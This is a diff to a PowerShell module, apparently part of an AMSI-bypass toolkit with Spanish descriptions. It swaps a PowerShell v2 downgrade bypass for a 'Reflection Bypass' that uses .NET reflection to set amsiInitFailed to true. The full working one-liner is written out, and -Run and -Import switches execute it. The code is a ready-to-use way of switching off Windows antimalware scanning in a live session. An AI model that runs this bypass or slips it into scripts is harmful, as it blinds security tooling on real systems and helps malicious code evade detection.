@@ -1,17 +1,16 @@
-function Invoke-PSDowngrade{
-
+function Invoke-Reflection{
+    
     [CmdletBinding()]
     Param(
     [string] $Get,
     [switch] $Run,
     [switch] $Import
     )
-    
-    $Bypass = New-Object -TypeName PSObject
-    $Name = "Downgrade de PowerShell"
-    $Description = "Este bypass consiste en usar la versión 2 de PowerShell, la cual no es compatible con AMSI, de tal forma que el contenido no es enviado al proveedor antimalware"
-    $Script = {powershell -v 2}
 
+    $Bypass = New-Object -TypeName PSObject
+    $Name = "Reflection Bypass"
+    $Description = "Este bypass fue publicado por Matt Graebers en twitter en 2016. Consiste en usar la reflexión de .NET para cambiar el valor 4ms1InitFail a true, lo que haría que AMSI no se cargue correctamente en la sesión de powershell activa"
+    $Script = {[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}
 
     $Bypass | Add-Member -MemberType NoteProperty -Name "Name" -Value $Name
     $Bypass | Add-Member -MemberType NoteProperty -Name "Description" -Value $Description
@@ -21,7 +20,6 @@ function Invoke-PSDowngrade{
 
     if($Run){
         $Bypass.RunScript()
-        return
     }
 
     if($Import){
